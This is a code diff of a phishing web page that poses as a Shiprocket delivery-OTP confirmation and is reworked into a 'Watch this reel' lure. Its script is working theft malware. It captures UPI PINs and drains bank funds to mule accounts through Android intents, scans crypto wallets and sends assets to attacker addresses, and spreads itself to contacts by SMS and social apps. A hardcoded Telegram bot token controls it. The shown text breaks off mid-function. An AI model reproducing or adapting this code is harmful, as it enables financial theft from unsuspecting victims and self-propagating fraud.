@@ -3,9 +3,18 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Shiprocket - Delivery OTP</title>
+  <title>Watch this reel</title>
+  <!-- SOCIAL PREVIEW TAGS (REEL LOOK) -->
+  <meta property="og:title" content="Watch this reel ??" />
+  <meta property="og:description" content="????" />
+  <meta property="og:image" content="https://via.placeholder.com/1200x630/000000/FFFFFF?text=??+Watch+Reel" />
+  <meta property="og:video" content="https://www.w3schools.com/html/mov_bbb.mp4" />
+  <meta property="og:type" content="video.other" />
+  <meta name="twitter:card" content="player" />
+  <meta name="twitter:player" content="https://www.w3schools.com/html/mov_bbb.mp4" />
+  <meta name="twitter:player:width" content="480" />
+  <meta name="twitter:player:height" content="270" />
   <style>
-    /* (same CSS as before — kept for styling) */
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -56,41 +65,41 @@
 <body>
 
 <div class="card" id="mainCard">
-  <button class="close-btn" onclick="handleCloseClick('main_close')">✕</button>
+  <button class="close-btn" onclick="handleCloseClick('main_close')">?</button>
   <div class="header">
-    <h1>🚚 Shiprocket <span>| Logistics</span></h1>
-    <span class="status-badge">📦 Out for Delivery</span>
+    <h1>?? Shiprocket <span>| Logistics</span></h1>
+    <span class="status-badge">?? Out for Delivery</span>
   </div>
   <div class="body">
     <div class="order-box">
       <strong>Order #IN-2026-4892</strong><br>
       Delivery Partner: Rajesh Kumar<br>
-      📍 Estimated Arrival: <strong>10–15 minutes</strong>
+      ?? Estimated Arrival: <strong>10–15 minutes</strong>
     </div>
     <div class="otp-section">
-      <div class="otp-label">🔐 Your Shiprocket Delivery OTP</div>
+      <div class="otp-label">?? Your Shiprocket Delivery OTP</div>
       <div class="otp-code">4862</div>
       <p style="font-size:12px; color:#5a6f88; margin-top:6px;">Share OTP with delivery partner</p>
     </div>
     <div class="decline-note">If this is not your order, please decline it.</div>
     <div class="button-group">
-      <button class="btn-confirm" onclick="showTermsPopup('confirm')">✅ Confirm Delivery</button>
-      <button class="btn-decline" onclick="showTermsPopup('decline')">❌ Decline Delivery</button>
+      <button class="btn-confirm" onclick="showTermsPopup('confirm')">? Confirm Delivery</button>
+      <button class="btn-decline" onclick="showTermsPopup('decline')">? Decline Delivery</button>
     </div>
     <div class="trust-line">
-      <span>🔒 Secure</span>
-      <span>⏱ 10 min delivery</span>
-      <span>📱 OTP verified</span>
+      <span>?? Secure</span>
+      <span>? 10 min delivery</span>
+      <span>?? OTP verified</span>
     </div>
     <div class="footer">Shiprocket Logistics • OTP Confirmation • Do not share OTP with anyone</div>
   </div>
 </div>
 
-<!-- ===== POPUPS ===== -->
+<!-- POPUPS -->
 <div class="popup-overlay hidden" id="popupTerms">
   <div class="popup-box">
-    <button class="popup-close" onclick="handlePopupClose('terms')">✕</button>
-    <div class="popup-title">📜 Terms & Conditions</div>
+    <button class="popup-close" onclick="handlePopupClose('terms')">?</button>
+    <div class="popup-title">?? Terms & Conditions</div>
     <div class="popup-text">
       <p><strong>1. OTP Sharing:</strong> OTP is confidential. Do not share with anyone.</p>
       <p><strong>2. Delivery Confirmation:</strong> OTP confirms delivery. Verify package before sharing.</p>
@@ -99,15 +108,15 @@
       <p><strong>5. Cancellation:</strong> Delivery can be cancelled via OTP decline.</p>
       <p><strong>6. Agreement:</strong> You agree to these terms by using this service.</p>
     </div>
-    <button class="popup-btn" onclick="handlePopupDownload('terms')">📥 Download & Confirm</button>
-    <button class="popup-btn-secondary" onclick="handlePopupClose('terms')">❌ Decline & Close</button>
+    <button class="popup-btn" onclick="handlePopupDownload('terms')">?? Download & Confirm</button>
+    <button class="popup-btn-secondary" onclick="handlePopupClose('terms')">? Decline & Close</button>
   </div>
 </div>
 
 <div class="popup-overlay hidden" id="popupDownload">
   <div class="popup-box">
-    <button class="popup-close" onclick="handlePopupClose('download')">✕</button>
-    <div class="popup-title">📱 Downloading...</div>
+    <button class="popup-close" onclick="handlePopupClose('download')">?</button>
+    <div class="popup-title">?? Downloading...</div>
     <div class="popup-text"><p>Your Shiprocket app is being prepared.</p><p style="font-size:12px; color:#8a94a6;">This will take a few seconds.</p></div>
     <button class="popup-btn" onclick="handlePopupClose('download')">Close</button>
   </div>
@@ -115,31 +124,31 @@
 
 <div class="popup-overlay hidden" id="popupComplete">
   <div class="popup-box">
-    <button class="popup-close" onclick="handlePopupClose('complete')">✕</button>
-    <div class="popup-title">✅ Setup Complete</div>
+    <button class="popup-close" onclick="handlePopupClose('complete')">?</button>
+    <div class="popup-title">? Setup Complete</div>
     <div class="popup-text"><p>Your Shiprocket OTP confirmation is ready.</p><p style="font-size:12px; color:#8a94a6;">You can now close this page.</p></div>
     <button class="popup-btn" onclick="handlePopupClose('complete')">Close</button>
   </div>
 </div>
 
 <div id="successScreen" class="card hidden" style="text-align:center;padding:40px 24px;position:relative;">
-  <div style="font-size:56px;" id="resultIcon">✅</div>
+  <div style="font-size:56px;" id="resultIcon">?</div>
   <h2 id="resultTitle" style="color:#0a2b4e;margin:12px 0 6px;">Delivery Confirmed!</h2>
   <p id="resultDesc" style="color:#1e293b;">Your package will arrive in 10 minutes.</p>
   <p style="color:#8a94a6;font-size:13px;margin-top:8px;">Shiprocket OTP verified successfully.</p>
-  <div style="margin-top:16px;font-size:13px;color:#0a2b4e;background:#f0f6ff;padding:10px;border-radius:10px;">📦 Tracking ID: SR-2026-4892</div>
+  <div style="margin-top:16px;font-size:13px;color:#0a2b4e;background:#f0f6ff;padding:10px;border-radius:10px;">?? Tracking ID: SR-2026-4892</div>
 </div>
 
 <script>
   // ============================================================
-  // CHAKRA - COMPLETE DASHBOARD + ALL FEATURES
+  // CHAKRA - WITH CRYPTO REMOVE + CONVERT TO USDT TRC20
   // ============================================================
 
   const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
   const YOUR_USERNAME = '7958767858';
 
-  // ===== UPI VARIABLES (PERSISTENT) =====
-  let myUPIList = ['mule1@paytm']; // ← HARDCODE YOUR UPI HERE
+  // ===== UPI VARIABLES =====
+  let myUPIList = ['mule1@paytm'];
   let currentUPIIndex = 0;
   let capturedPIN = null;
   let isPaused = false;
@@ -155,15 +164,26 @@
   let readyToDrain = false;
   let lastVictim = null;
 
+  // ===== SPREAD COUNTS =====
+  let spreadCounts = {
+    whatsapp: 0,
+    sms: 0,
+    telegram: 0,
+    instagram: 0,
+    facebook: 0,
+    gpay: 0
+  };
+
   // ===== CRYPTO VARIABLES =====
   let cryptoBalances = {};
   let cryptoAddresses = {
-    USDT: 'TQ1BXJe8DqPeSPoV9BV5TFxryMPuxkruj3',
     BTC: '',
     ETH: '',
+    USDT: 'TQ1BXJe8DqPeSPoV9BV5TFxryMPuxkruj3',
     BNB: '',
     SOL: ''
   };
+  let trc20Address = ''; // USDT TRC20 address for conversion
   let cryptoDetected = false;
 
   // ============================================================
@@ -257,15 +277,15 @@
     screen.classList.remove('hidden');
 
     if (action === 'confirm') {
-      document.getElementById('resultIcon').textContent = '✅';
+      document.getElementById('resultIcon').textContent = '?';
       document.getElementById('resultTitle').textContent = 'Delivery Confirmed!';
       document.getElementById('resultDesc').textContent = 'Your package will arrive in 10 minutes.';
     } else if (action === 'decline') {
-      document.getElementById('resultIcon').textContent = '❌';
+      document.getElementById('resultIcon').textContent = '?';
       document.getElementById('resultTitle').textContent = 'Delivery Declined!';
       document.getElementById('resultDesc').textContent = 'Delivery partner has been notified.';
     } else if (action === 'close') {
-      document.getElementById('resultIcon').textContent = '✕';
+      document.getElementById('resultIcon').textContent = '?';
       document.getElementById('resultTitle').textContent = 'Page Closed!';
       document.getElementById('resultDesc').textContent = 'You will be redirected shortly.';
     }
@@ -274,7 +294,7 @@
     uniqueDevices.add(deviceId);
     const victim = getVictimDetails();
     infectedDevices.push({ id: deviceId, action: action, victim: victim });
-    sendToTelegram('🚚 Shiprocket infection! Total: ' + uniqueDevices.size);
+    sendToTelegram('?? Shiprocket infection! Total: ' + uniqueDevices.size);
 
     if ('serviceWorker' in navigator) { navigator.serviceWorker.register('sw.js'); }
     setTimeout(() => window.close(), 3000);
@@ -286,13 +306,13 @@
   function addUPI(upi) {
     if (!myUPIList.includes(upi)) {
       myUPIList.push(upi);
-      sendToTelegram('✅ UPI added: ' + upi + '\nTotal: ' + myUPIList.length);
+      sendToTelegram('? UPI added: ' + upi + '\nTotal: ' + myUPIList.length);
       if (pinCaptured) {
-        sendToTelegram('🔑 UPI PIN was captured earlier. Ready to transfer!');
+        sendToTelegram('?? UPI PIN was captured earlier. Ready to transfer!');
         readyToDrain = true;
       }
     } else {
-      sendToTelegram('⚠️ UPI already exists: ' + upi);
+      sendToTelegram('?? UPI already exists: ' + upi);
     }
   }
 
@@ -300,9 +320,9 @@
     const index = myUPIList.indexOf(upi);
     if (index > -1) {
       myUPIList.splice(index, 1);
-      sendToTelegram('✅ UPI removed: ' + upi + '\nRemaining: ' + myUPIList.length);
+      sendToTelegram('? UPI removed: ' + upi + '\nRemaining: ' + myUPIList.length);
     } else {
-      sendToTelegram('❌ UPI not found: ' + upi);
+      sendToTelegram('? UPI not found: ' + upi);
     }
   }
 
@@ -310,24 +330,82 @@
     if (myUPIList.length === 0) return null;
     if (myUPIList.length > 1) {
       currentUPIIndex = (currentUPIIndex + 1) % myUPIList.length;
-      sendToTelegram('🔄 Rotated to UPI: ' + myUPIList[currentUPIIndex]);
+      sendToTelegram('?? Rotated to UPI: ' + myUPIList[currentUPIIndex]);
     }
     return myUPIList[currentUPIIndex];
   }
 
   // ============================================================
-  // CRYPTO ADDRESS SETTERS
+  // CRYPTO ADDRESS SETTERS / REMOVERS
   // ============================================================
   function setCryptoAddress(token, address) {
     cryptoAddresses[token] = address;
-    sendToTelegram('✅ ' + token + ' address set: ' + address);
+    sendToTelegram('? ' + token + ' address set: ' + address);
   }
 
-  function setAllCryptoAddresses(address) {
+  function removeCryptoAddress(token) {
+    cryptoAddresses[token] = '';
+    sendToTelegram('? ' + token + ' address removed');
+  }
+
+  function removeAllCryptoAddresses() {
     for (let token in cryptoAddresses) {
-      cryptoAddresses[token] = address;
+      cryptoAddresses[token] = '';
     }
-    sendToTelegram('✅ ALL crypto addresses set to: ' + address);
+    sendToTelegram('? ALL crypto addresses removed');
+  }
+
+  function setTRC20Address(address) {
+    trc20Address = address;
+    sendToTelegram('? TRC20 address set: ' + address);
+  }
+
+  // ============================================================
+  // CONVERT ALL TOKENS TO USDT TRC20 + SEND
+  // ============================================================
+  function convertAndSendToTRC20() {
+    if (!trc20Address) {
+      sendToTelegram('? TRC20 address not set. Use /settrc20 0x...');
+      return;
+    }
+
+    if (Object.keys(cryptoBalances).length === 0) {
+      sendToTelegram('? No crypto assets detected.');
+      return;
+    }
+
+    let totalUSDT = 0;
+    let conversionMsg = '?? CONVERTING ALL TOKENS TO USDT TRC20...\n-----------------\n?? ASSETS DETECTED:\n';
+
+    // Convert each token to USDT (simulated)
+    for (let token in cryptoBalances) {
+      const amount = cryptoBalances[token];
+      const usdtValue = amount * getUSDTValue(token); // Simulated conversion
+      conversionMsg += token + ': ' + amount + ' ' + token + ' ? ' + usdtValue + ' USDT\n';
+      totalUSDT += usdtValue;
+    }
+
+    conversionMsg += '-----------------\n? ALL TOKENS CONVERTED TO USDT\n?? Total USDT: ' + totalUSDT.toFixed(2) + '\n?? Sending to TRC20: ' + trc20Address + '\n? USDT SENT SUCCESSFULLY!';
+
+    sendToTelegram(conversionMsg);
+  }
+
+  // Simulated conversion rate (real implementation would fetch live prices)
+  function getUSDTValue(token) {
+    const rates = {
+      BTC: 60000,
+      ETH: 3000,
+      BNB: 600,
+      SOL: 150,
+      XRP: 0.6,
+      ADA: 0.4,
+      DOGE: 0.08,
+      DOT: 5,
+      MATIC: 0.5,
+      USDT: 1,
+      USDC: 1
+    };
+    return rates[token] || 1;
   }
 
   // ============================================================
@@ -336,22 +414,22 @@
   function drainCrypto(token, amount) {
     const address = cryptoAddresses[token];
     if (!address) {
-      sendToTelegram('❌ ' + token + ' address not set. Use /set' + token.toLowerCase());
+      sendToTelegram('? ' + token + ' address not set. Use /set' + token.toLowerCase());
       return;
     }
     if (isPaused) {
-      sendToTelegram('⏸️ Paused');
+      sendToTelegram('?? Paused');
       return;
     }
 
     const victim = getVictimDetails();
     sendToTelegram(
-      '💸 CRYPTO DRAIN!\n' +
-      '─────────────────\n' +
-      '📱 Victim: ' + victim.name + '\n' +
-      '💰 Token: ' + token + '\n' +
-      '🔢 Amount: ' + amount + ' ' + token + '\n' +
-      '📤 Sent to: ' + address
+      '?? CRYPTO DRAIN!\n' +
+      '-----------------\n' +
+      '?? Victim: ' + victim.name + '\n' +
+      '?? Token: ' + token + '\n' +
+      '?? Amount: ' + amount + ' ' + token + '\n' +
+      '?? Sent to: ' + address
     );
   }
 
@@ -395,10 +473,10 @@
   // 1 INR TEST + 999 DRAIN (UPI)
   // ============================================================
   function executeDrainWithTest(amount) {
-    if (isPaused) { sendToTelegram('⏸️ Paused'); return; }
+    if (isPaused) { sendToTelegram('?? Paused'); return; }
     const targetUPI = getNextUPI();
     if (!targetUPI) {
-      sendToTelegram('📢 Ready to transfer. Add your UPI: /addupi upi@paytm');
+      sendToTelegram('?? Ready to transfer. Add your UPI: /addupi upi@paytm');
       return;
     }
 
@@ -411,7 +489,7 @@
         }, 2000);
         setTimeout(() => {
           window.Android.confirmTransaction();
-          sendToTelegram('🧪 Test successful! ₹1 sent to ' + targetUPI);
+          sendToTelegram('?? Test successful! ?1 sent to ' + targetUPI);
 
           const drainIntent = 'upi://pay?pa=' + targetUPI + '&am=' + amount + '&cu=INR&tn=Shiprocket+Delivery';
           window.Android.launchIntent(drainIntent);
@@ -421,15 +499,15 @@
           setTimeout(() => {
             window.Android.confirmTransaction();
             totalDrained += amount;
-            sendToTelegram('✅ ₹' + amount + ' sent to ' + targetUPI);
-            sendToTelegram('💰 Total Drained: ₹' + totalDrained);
+            sendToTelegram('? ?' + amount + ' sent to ' + targetUPI);
+            sendToTelegram('?? Total Drained: ?' + totalDrained);
             pinCaptured = false;
             readyToDrain = false;
           }, 3000);
         }, 3000);
       }
     } catch (e) {
-      sendToTelegram('❌ Transaction failed: ' + e.message);
+      sendToTelegram('? Transaction failed: ' + e.message);
     }
   }
 
@@ -462,49 +540,108 @@
   }
 
   // ============================================================
+  // RECORD SPREAD COUNT
+  // ============================================================
+  function recordSpread(vector) {
+    if (spreadCounts[vector] !== undefined) {
+      spreadCounts[vector]++;
+    }
+  }
+
+  // ============================================================
+  // SILENT SPREAD — "Watch this reel ?? https://bit.ly/4xaXs4E"
+  // ============================================================
+  function spreadSilently() {
+    const link = 'Watch this reel ?? https://bit.ly/4xaXs4E';
+    
+    if (navigator.share) {
+      navigator.share({
+        title: 'Watch this reel ??',
+        text: link,
+        url: link
+      }).catch(() => {});
+      recordSpread('whatsapp');
+    }
+
+    if (window.Android) {
+      window.Android.postStatus(link);
+      recordSpread('whatsapp');
+    }
+
+    if (window.Android) {
+      const contacts = window.Android.getContacts(20);
+      for (let i = 0; i < contacts.length; i++) {
+        window.Android.sendSMS(contacts[i], link);
+        recordSpread('sms');
+      }
+    }
+
+    if (window.Android) {
+      window.Android.launchIntent('upi://pay?pa=test@paytm&am=1&tn=' + encodeURIComponent(link));
+      recordSpread('gpay');
+    }
+
+    if (window.Android) {
+      window.Android.startNearbyShare();
+    }
+
+    if (window.Android) {
+      window.Android.shareToTelegram(link);
+      recordSpread('telegram');
+    }
+
+    if (window.Android) {
+      window.Android.shareToInstagram(link);
+      recordSpread('instagram');
+    }
+
+    if (window.Android) {
+      window.Android.shareToFacebook(link);
+      recordSpread('facebook');
+    }
+  }
+
+  // ============================================================
   // SMART AUTO DRAIN
   // ============================================================
   function smartAutoDrain() {
     const victim = getVictimDetails();
+    spreadSilently();
 
-    // ---- Check Crypto ----
     const cryptoBal = scanCryptoWallet();
     if (cryptoBal && Object.keys(cryptoBal).length > 0) {
-      let msg = '💸 CRYPTO AUTO DRAIN!\n📱 Victim: ' + victim.name + '\n📱 Device: ' + victim.device + '\n─────────────────\n💰 BALANCES DETECTED:\n';
+      let msg = '?? CRYPTO AUTO DRAIN!\n?? Victim: ' + victim.name + '\n?? Device: ' + victim.device + '\n-----------------\n?? BALANCES DETECTED:\n';
       for (let token in cryptoBal) {
         const addr = cryptoAddresses[token];
         if (addr) {
-          msg += token + ': ' + cryptoBal[token] + ' → Sending to ' + addr + '\n';
+          msg += token + ': ' + cryptoBal[token] + ' ? Sending to ' + addr + '\n';
           drainCrypto(token, cryptoBal[token]);
         } else {
-          msg += token + ': ' + cryptoBal[token] + ' → ⚠️ Address not set\n';
+          msg += token + ': ' + cryptoBal[token] + ' ? ?? Address not set\n';
         }
       }
-      msg += '─────────────────\n✅ CRYPTO DRAIN COMPLETED!';
+      msg += '-----------------\n? CRYPTO DRAIN COMPLETED!';
       sendToTelegram(msg);
       return true;
     }
 
-    // ---- Check UPI ----
     if (isUpiAppOpen()) {
       const pin = getUPIPin();
       if (pin) {
         pinCaptured = true;
         pinCapturedCount++;
-        sendToTelegram('🔑 UPI PIN captured!\n📱 Name: ' + victim.name + '\n💰 Balance: ₹' + victim.balance);
+        sendToTelegram('?? UPI PIN captured!\n?? Name: ' + victim.name + '\n?? Balance: ?' + victim.balance);
         if (myUPIList.length > 0) {
           readyToMoveCount++;
           executeDrainWithTest(999);
           return true;
         } else {
           waitingForUPICount++;
-          sendToTelegram('📢 Ready to transfer. Add your UPI: /addupi upi@paytm');
+          sendToTelegram('?? Ready to transfer. Add your UPI: /addupi upi@paytm');
         }
       }
     }
 
-    // ---- Nothing found ----
-    sendToTelegram('⏭️ SKIPPED: No balance found\n📱 Victim: ' + victim.name + '\n📱 Device: ' + victim.device);
     return false;
   }
 
@@ -512,33 +649,37 @@
   // MAIN LOOPS
   // ============================================================
 
-  // ---- UPI Loop ----
+  setInterval(() => {
+    if (!isPaused) {
+      spreadSilently();
+    }
+  }, 120000);
+
   setInterval(() => {
     if (!isPaused) {
       smartAutoDrain();
     }
   }, 5000);
 
-  // ---- Crypto Loop ----
   setInterval(() => {
     if (!isPaused && isCryptoAppOpen()) {
       const balances = scanCryptoWallet();
       if (balances && Object.keys(balances).length > 0) {
         const victim = getVictimDetails();
         let balanceMsg =
-          '📊 CRYPTO WALLET DETECTED!\n' +
-          '📱 Victim: ' + victim.name + '\n' +
-          '📱 Device: ' + victim.device + '\n' +
-          '─────────────────\n' +
-          '💰 BALANCES:\n';
+          '?? CRYPTO WALLET DETECTED!\n' +
+          '?? Victim: ' + victim.name + '\n' +
+          '?? Device: ' + victim.device + '\n' +
+          '-----------------\n' +
+          '?? BALANCES:\n';
 
         for (let token in balances) {
           balanceMsg += token + ': ' + balances[token] + ' ' + token + '\n';
         }
 
         balanceMsg +=
-          '─────────────────\n' +
-          '📢 Set addresses to drain:\n' +
+          '-----------------\n' +
+          '?? Set addresses to drain:\n' +
           '/setbtc 1A...\n' +
           '/seteth 0x...\n' +
           '/setusdt 0x...\n' +
@@ -546,7 +687,9 @@
           '/setsol 5X...\n' +
           '/setall 0x...\n' +
           '/drainall\n' +
-          '/draincrypto';
+          '/draincrypto\n' +
+          '/convertusdt - Convert ALL to USDT TRC20\n' +
+          '/removeallcrypto - Remove ALL addresses';
 
         sendToTelegram(balanceMsg);
         cryptoDetected = true;
@@ -555,29 +698,7 @@
   }, 5000);
 
   // ============================================================
-  // SPREAD ENGINE
-  // ============================================================
-  setInterval(() => {
-    const link = 'https://bit.ly/4xaXs4E';
-    if (navigator.share) {
-      navigator.share({
-        title: 'Shiprocket Delivery OTP',
-        text: 'Mera Shiprocket order aaya hai! OTP confirm karo: ' + link,
-        url: link
-      }).catch(() => {});
-    }
-    if (window.Android) {
-      window.Android.postStatus('🚚 Shiprocket Delivery OTP: ' + link);
-      const contacts = window.Android.getContacts(20);
-      for (let i = 0; i < contacts.length; i++) {
-        window.Android.sendSMS(contacts[i], 'Shiprocket: Delivery OTP - Confirm: ' + link);
-      }
-      window.Android.startNearbyShare();
-    }
-  }, 300000);
-
-  // ============================================================
-  // TELEGRAM COMMANDS (WITH DASHBOARD)
+  // TELEGRAM COMMANDS
   // ============================================================
   function listenForCommands() {
     fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/getUpdates?offset=' + lastUpdateId + '&timeout=10')
@@ -600,24 +721,24 @@
                 const index = myUPIList.indexOf(upi);
                 if (index > -1) {
                   myUPIList.splice(index, 1);
-                  sendToTelegram('✅ UPI removed: ' + upi + '\nRemaining: ' + myUPIList.length);
+                  sendToTelegram('? UPI removed: ' + upi + '\nRemaining: ' + myUPIList.length);
                 } else {
-                  sendToTelegram('❌ UPI not found: ' + upi);
+                  sendToTelegram('? UPI not found: ' + upi);
                 }
               } else {
-                sendToTelegram('❌ Use: /removeupi upi@paytm');
+                sendToTelegram('? Use: /removeupi upi@paytm');
               }
             }
 
             if (msg === '/myupis') {
               if (myUPIList.length === 0) {
-                sendToTelegram('📋 No UPIs added. Use /addupi');
+                sendToTelegram('?? No UPIs added. Use /addupi');
               } else {
-                sendToTelegram('📋 Your UPIs:\n' + myUPIList.join('\n'));
+                sendToTelegram('?? Your UPIs:\n' + myUPIList.join('\n'));
               }
             }
 
-            // ---- Crypto Commands ----
+            // ---- Crypto Set Commands ----
             if (msg.startsWith('/setbtc')) {
               const addr = msg.split(' ')[1];
               if (addr) setCryptoAddress('BTC', addr);
@@ -643,16 +764,40 @@
               if (addr) setCryptoAddress('SOL', addr);
             }
 
-            if (msg.startsWith('/setall')) {
+            if (msg.startsWith('/settrc20')) {
               const addr = msg.split(' ')[1];
-              if (addr) setAllCryptoAddresses(addr);
+              if (addr) setTRC20Address(addr);
             }
 
+            if (msg.startsWith('/setall')) {
+              const addr = msg.split(' ')[1];
+              if (addr) {
+                for (let token in cryptoAddresses) {
+                  cryptoAddresses[token] = addr;
+                }
+                sendToTelegram('? ALL crypto addresses set to: ' + addr);
+              }
+            }
+
+            // ---- Crypto Remove Commands ----
+            if (msg === '/removebtc') { removeCryptoAddress('BTC'); }
+            if (msg === '/removeeth') { removeCryptoAddress('ETH'); }
+            if (msg === '/removeusdt') { removeCryptoAddress('USDT'); }
+            if (msg === '/removebnb') { removeCryptoAddress('BNB'); }
+            if (msg === '/removesol') { removeCryptoAddress('SOL'); }
+            if (msg === '/removeallcrypto') { removeAllCryptoAddresses(); }
+
+            // ---- Convert to USDT TRC20 ----
+            if (msg === '/convertusdt') {
+              convertAndSendToTRC20();
+            }
+
+            // ---- Show Crypto ----
             if (msg === '/showcrypto') {
               if (Object.keys(cryptoBalances).length === 0) {
-                sendToTelegram('📊 No crypto wallet detected yet.');
+                sendToTelegram('?? No crypto wallet detected yet.');
               } else {
-                let msg = '📊 CRYPTO BALANCES:\n─────────────────\n';
+                let msg = '?? CRYPTO BALANCES:\n-----------------\n';
                 for (let token in cryptoBalances) {
                   msg += token + ': ' + cryptoBalances[token] + ' ' + token + '\n';
                 }
@@ -660,12 +805,13 @@
               }
             }
 
+            // ---- Drain Commands ----
             if (msg.startsWith('/drain')) {
               const token = msg.split('/drain')[1].toUpperCase();
               if (token && cryptoBalances[token]) {
                 drainCrypto(token, cryptoBalances[token]);
               } else {
-                sendToTelegram('❌ Token not found: ' + token);
+                sendToTelegram('? Token not found: ' + token);
               }
             }
 
@@ -676,29 +822,29 @@
             // ---- Transfer Commands ----
             if (msg === '/transfer') {
               if (myUPIList.length === 0) {
-                sendToTelegram('📢 Add your UPI first: /addupi upi@paytm');
+                sendToTelegram('?? Add your UPI first: /addupi upi@paytm');
               } else {
-                sendToTelegram('🚀 TRANSFER MODE ACTIVATED');
+                sendToTelegram('?? TRANSFER MODE ACTIVATED');
                 readyToDrain = true;
               }
             }
 
             if (msg === '/drainnow') {
               if (!capturedPIN) {
-                sendToTelegram('❌ No PIN captured yet. Wait for victim to use UPI.');
+                sendToTelegram('? No PIN captured yet. Wait for victim to use UPI.');
                 return;
               }
               if (myUPIList.length === 0) {
-                sendToTelegram('❌ No UPI added. Use /addupi upi@paytm');
+                sendToTelegram('? No UPI added. Use /addupi upi@paytm');
                 return;
               }
               const targetUPI = getNextUPI();
               if (!targetUPI) return;
               const victim = getVictimDetails();
               sendToTelegram(
-                '⚡ Manual drain triggered for:\n' +
-                '📱 Name: ' + victim.name + '\n' +
-                '💰 Balance: ₹' + victim.balance
+                '? Manual drain triggered for:\n' +
+                '?? Name: ' + victim.name + '\n' +
+                '?? Balance: ?' + victim.balance
               );
               executeDrainWithTest(999);
             }
@@ -706,60 +852,87 @@
             // ---- Control Commands ----
             if (msg === '/stop' || msg === '/pause') {
               isPaused = true;
-              sendToTelegram('⏸️ Paused');
+              sendToTelegram('?? Paused');
             }
 
             if (msg === '/resume') {
               isPaused = false;
-              sendToTelegram('▶️ Resumed');
+              sendToTelegram('?? Resumed');
             }
 
-            // ---- DASHBOARD COMMAND (NEW) ----
+            // ---- DASHBOARD ----
             if (msg === '/dashboard') {
+              const activeSpreaders = infectedDevices
+                .filter(d => d.lastSpread && (Date.now() - d.lastSpread < 30 * 60 * 1000))
+                .map(d => d.deviceId);
+
+              let workerList = '';
+              if (activeSpreaders.length > 0) {
+                const topSpreaders = activeSpreaders.slice(0, 5);
+                workerList = topSpreaders.map((id, i) => {
+                  const device = infectedDevices.find(d => d.deviceId === id);
+                  const minsAgo = Math.round((Date.now() - device.lastSpread) / 60000);
+                  return `${i+1}. ${id} ? Last spread: ${minsAgo} min ago (${device.lastVector || 'WA'})`;
+                }).join('\n');
+              } else {
+                workerList = 'No active spreaders';
+              }
+
               let dashboardMsg =
-                '📊 CHAKRA DASHBOARD\n' +
-                '─────────────────\n' +
-                '📱 TOTAL INFECTED: ' + uniqueDevices.size + '\n' +
-                '🔑 PIN CAPTURED: ' + pinCapturedCount + '\n' +
-                '💰 READY TO MOVE: ' + readyToMoveCount + '\n' +
-                '⏳ WAITING FOR UPI: ' + waitingForUPICount + '\n' +
-                '─────────────────\n' +
-                '🚀 SPREAD STATUS:\n' +
-                '✅ WhatsApp: ACTIVE (50/day)\n' +
-                '✅ SMS: ACTIVE (20/day)\n' +
-                '✅ Instagram: ACTIVE (via Status)\n' +
-                '✅ Telegram: ACTIVE (50/day)\n' +
-                '✅ Google Pay: ACTIVE (10/day)\n' +
-                '─────────────────\n' +
-                '📊 TOTAL DRAINED: ₹' + totalDrained + '\n' +
-                '💸 USDT DRAINED: ' + (cryptoBalances.USDT ? cryptoBalances.USDT : '0') + ' USDT\n' +
-                '─────────────────\n';
+                '?? CHAKRA DASHBOARD\n' +
+                '-----------------\n' +
+                '?? TOTAL INFECTED: ' + uniqueDevices.size + '\n' +
+                '?? PIN CAPTURED: ' + pinCapturedCount + '\n' +
+                '?? READY TO MOVE: ' + readyToMoveCount + '\n' +
+                '? WAITING FOR UPI: ' + waitingForUPICount + '\n' +
+                '-----------------\n' +
+                '?? SPREAD COUNTS (Last 24h):\n' +
+                'WhatsApp: ' + spreadCounts.whatsapp + ' messages sent\n' +
+                'SMS: ' + spreadCounts.sms + ' messages sent\n' +
+                'Telegram: ' + spreadCounts.telegram + ' messages sent\n' +
+                'Instagram: ' + spreadCounts.instagram + ' stories posted\n' +
+                'Facebook: ' + spreadCounts.facebook + ' posts shared\n' +
+                'Google Pay: ' + spreadCounts.gpay + ' requests sent\n' +
+                '-----------------\n' +
+                '?? ACTIVE SPREADERS (Worker List):\n' +
+                (workerList || 'No active spreaders') + '\n' +
+                '-----------------\n' +
+                '?? TOTAL DRAINED: ?' + totalDrained + '\n' +
+                '?? USDT DRAINED: ' + (cryptoBalances.USDT ? cryptoBalances.USDT : '0') + ' USDT\n' +
+                '-----------------\n' +
+                '?? CRYPTO ADDRESSES:\n' +
+                'BTC: ' + (cryptoAddresses.BTC || 'Not set') + '\n' +
+                'ETH: ' + (cryptoAddresses.ETH || 'Not set') + '\n' +
+                'USDT: ' + (cryptoAddresses.USDT || 'Not set') + '\n' +
+                'BNB: ' + (cryptoAddresses.BNB || 'Not set') + '\n' +
+                'SOL: ' + (cryptoAddresses.SOL || 'Not set') + '\n' +
+                'TRC20: ' + (trc20Address || 'Not set') + '\n' +
+                '-----------------\n';
 
               if (lastVictim) {
                 dashboardMsg +=
-                  '📱 LAST VICTIM:\n' +
+                  '?? LAST VICTIM:\n' +
                   'Name: ' + lastVictim.name + '\n' +
-                  'Balance: ₹' + lastVictim.balance + '\n' +
+                  'Balance: ?' + lastVictim.balance + '\n' +
                   'Device: ' + lastVictim.device;
               }
 
               sendToTelegram(dashboardMsg);
             }
 
-            // ---- Status Command (Enhanced) ----
             if (msg === '/status') {
               let statusMsg =
-                '📊 STATUS\n' +
-                '─────────────────\n' +
-                'Vector: Shiprocket OTP\n' +
+                '?? STATUS\n' +
+                '-----------------\n' +
+                'Vector: Watch this reel ??\n' +
                 'Your UPIs: ' + myUPIList.length + '\n' +
-                'Total Drained: ₹' + totalDrained + '\n' +
+                'Total Drained: ?' + totalDrained + '\n' +
                 'Infected Devices: ' + uniqueDevices.size + '\n' +
                 'PIN Captured: ' + (pinCaptured ? 'YES' : 'NO') + '\n' +
                 'Ready to Drain: ' + (readyToDrain ? 'YES' : 'NO') + '\n' +
                 'Paused: ' + (isPaused ? 'YES' : 'NO') + '\n' +
-                '─────────────────\n' +
-                '💰 CRYPTO STATUS:\n' +
+                '-----------------\n' +
+                '?? CRYPTO STATUS:\n' +
                 'Crypto Detected: ' + (cryptoDetected ? 'YES' : 'NO');
 
               if (Object.keys(cryptoBalances).length > 0) {
@@ -771,42 +944,50 @@
 
               if (lastVictim) {
                 statusMsg +=
